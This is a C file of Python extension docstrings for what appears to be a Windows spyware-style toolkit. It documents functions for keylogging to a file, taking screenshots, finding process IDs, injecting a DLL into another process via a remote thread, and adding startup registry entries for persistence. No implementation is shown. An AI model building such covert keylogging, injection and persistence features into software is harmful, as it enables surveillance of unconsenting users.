#define PY_SSIZE_T_CLEAN
#include <Python.h>

PyDoc_STRVAR(
    keylog_to_file_doc,
    "keylog_to_file(path: str, /)\n"
    "--\n"
    "\n"
    "def keylog_to_file(path: str)\n"
    "Start keylogging into a file.");

PyDoc_STRVAR(
    screenshot_doc,
    "screenshot(path: str, /)\n"
    "--\n"
    "\n"
    "def screenshot(path: str)\n"
    "Save screenshot to path.");

PyDoc_STRVAR(
    get_pid_by_name_doc,
    "get_pid_by_name(name: str, /)\n"
    "--\n"
    "\n"
    "def get_pid_by_name(name: str)\n"
    "Return the first process's pid that matches name(use wcsicmp(from start, allow partial"
    " case insensetive)).");

PyDoc_STRVAR(
    get_pids_by_name_doc,
    "get_pids_by_name(name: str, /)\n"
    "--\n"
    "\n"
    "def get_pids_by_name(name: str)\n"
    "Return a list of processes's pid that matches name(use wcsicmp(from start, allow partial"
    " case insensetive)).");

PyDoc_STRVAR(
    remote_thread_injection_doc,
    "remote_thread_injection(dll_path: str, pid: int, /)\n"
    "--\n"
    "\n"
    "def remote_thread_injection(dll_path: str, pid: int)\n"
    "Inject dll to target process.");

PyDoc_STRVAR(
    set_startup_reg_doc,
    "set_startup_reg(key: str, path: str, /)\n"
    "--\n"
    "\n"
    "def set_startup_reg(key: str, path: str)\n"
    "Set an entry in startup registry for the executable specified by path.");

PyDoc_STRVAR(
    delete_startup_reg_doc,
    "delete_startup_reg(key: str, /)\n"
    "--\n"
    "\n"
    "def delete_startup_reg(key: str)\n"
    "Delete an entry in startup registry");

